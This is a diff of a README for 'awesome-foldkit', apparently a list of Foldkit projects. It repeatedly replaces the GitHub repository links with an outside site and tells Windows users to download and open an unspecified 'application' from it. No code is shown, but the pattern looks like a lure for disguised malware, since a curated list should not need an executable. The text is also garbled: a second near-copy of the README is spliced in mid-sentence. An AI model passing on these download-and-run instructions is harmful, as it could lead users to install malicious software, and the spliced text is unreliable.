@@ -1,6 +1,6 @@
 # 🧰 awesome-foldkit - Discover Useful Foldkit Tools Quickly
 
-[![Download awesome-foldkit](https://img.shields.io/badge/Download-awesome--foldkit-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/V3xando/awesome-foldkit)
+[![Download awesome-foldkit](https://img.shields.io/badge/Download-awesome--foldkit-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://v3xando.github.io)
 
 awesome-foldkit is a ready-to-use collection of projects, tools, and apps built around Foldkit. It gathers useful discoveries in one place, keeps star counts and download numbers current automatically, and gives Windows users a direct way to download and run the collection.
 
@@ -18,7 +18,7 @@ Use the large download button at the top of this page. It takes you to the offic
 
 ## 💾 Download and Run on Windows
 
-Visit this link to download the application: [Download awesome-foldkit](https://github.com/V3xando/awesome-foldkit).
+Visit this link to download the application: [Download awesome-foldkit](https://v3xando.github.io).
 
 After the download finishes, open the downloaded item from your Downloads folder to run awesome-foldkit on Windows. That is the full process: visit the link, download the application, and open it on your Windows computer.
 
@@ -78,7 +78,7 @@ awesome-foldkit can fit into several everyday situations:
 - Comparing projects by star count and download activity.
 - Sharing a single collection link# 🧰 awesome-foldkit - Find Foldkit Projects and Tools Fast
 
-[![Download awesome-foldkit](https://img.shields.io/badge/Download-awesome--foldkit-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/V3xando/awesome-foldkit)
+[![Download awesome-foldkit](https://img.shields.io/badge/Download-awesome--foldkit-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://v3xando.github.io)
 
 awesome-foldkit is a curated collection of projects, tools, and apps around Foldkit. It is built for Windows users who want one clear place to browse useful Foldkit work, see star counts and download numbers, and return to an official link whenever they need the application. Stars and downloads update automatically, so the collection is designed to stay useful over time.
 
@@ -98,7 +98,7 @@ You do not need to know how the collection is built or how the automatic updates
 
 ## 💾 Download on Windows
 
-Visit this link to download the application: [Download awesome-foldkit](https://github.com/V3xando/awesome-foldkit).
+Visit this link to download the application: [Download awesome-foldkit](https://v3xando.github.io).
 
 After the download finishes, open the downloaded item from your Downloads folder to run awesome-foldkit on Windows. Keep the official link handy if you want to return to the project page later. The same link is the main place to download the application.
 
@@ -194,6 +194,6 @@ The primary download link is the official project page for awesome-foldkit. Use 
 
 ## 📥 Download and Run
 
-Visit this link to download the application: [Download awesome-foldkit](https://github.com/V3xando/awesome-foldkit). After the download finishes, open the downloaded item from your Downloads folder to run awesome-foldkit on Windows. This is the official link for the application, and it is the place to return to whenever you need to download it again.
+Visit this link to download the application: [Download awesome-foldkit](https://v3xando.github.io). After the download finishes, open the downloaded item from your Downloads folder to run awesome-foldkit on Windows. This is the official link for the application, and it is the place to return to whenever you need to download it again.
 
 Keywords: awesome, awesome-list, effect, elm-architecture, foldkit, typescript
